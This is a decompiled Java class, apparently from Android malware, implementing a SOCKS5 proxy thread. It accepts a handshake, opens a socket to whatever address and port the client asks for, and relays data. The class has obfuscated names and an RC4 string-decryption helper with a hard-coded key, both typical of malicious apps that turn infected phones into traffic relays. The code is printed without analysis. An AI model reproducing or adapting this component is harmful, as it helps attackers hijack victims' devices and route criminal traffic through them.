/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.util.Base64
 */
package com.example.mmm.API;

import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;
import com.example.mmm.unmapped.Hollyanne;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;

public final class SocksThread
implements Runnable {
    constants central$ = new constants();
    utils house$ = new utils();
    private Socket opposite$;
    private int villages$ = 102400;

    public SocksThread(Socket socket) {
        this.opposite$ = socket;
    }

    private String _french(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    @Override
    public final void run() {
        InputStream inputStream = this.opposite$.getInputStream();
        OutputStream outputStream = this.opposite$.getOutputStream();
        byte[] arrby = new byte[this.villages$];
        inputStream.read(arrby, 0, 3);
        outputStream.write(new byte[]{5, 0});
        outputStream.flush();
        inputStream.read(arrby, 0, 10);
        Object object = new StringBuilder();
        ((StringBuilder)object).append(arrby[4] & 255);
        ((StringBuilder)object).append(".");
        ((StringBuilder)object).append(arrby[5] & 255);
        ((StringBuilder)object).append(".");
        ((StringBuilder)object).append(arrby[6] & 255);
        ((StringBuilder)object).append(".");
        ((StringBuilder)object).append(arrby[7] & 255);
        Socket socket = new Socket(((StringBuilder)object).toString(), (arrby[8] & 255) * 256 + (arrby[9] & 255));
        InputStream inputStream2 = socket.getInputStream();
        object = socket.getOutputStream();
        byte[] arrby2 = socket.getLocalAddress().getAddress();
        int n2 = socket.getLocalPort();
        outputStream.write(new byte[]{5, 0, 0, 1, arrby2[0], arrby2[1], arrby2[2], arrby2[3], (byte)(n2 >> 8), (byte)(n2 & 255)}, 0, 10);
        outputStream.flush();
        new Hollyanne(inputStream2, outputStream).start();
        outputStream = new ByteArrayOutputStream();
        do {
            if ((n2 = inputStream.read(arrby, 0, this.villages$)) <= 0) {
                if (this.opposite$ == null) return;
                this.opposite$.close();
                return;
            }
            ((OutputStream)object).write(arrby, 0, n2);
            ((ByteArrayOutputStream)outputStream).write(arrby, 0, n2);
            ((OutputStream)object).flush();
        } while (true);
    }
}

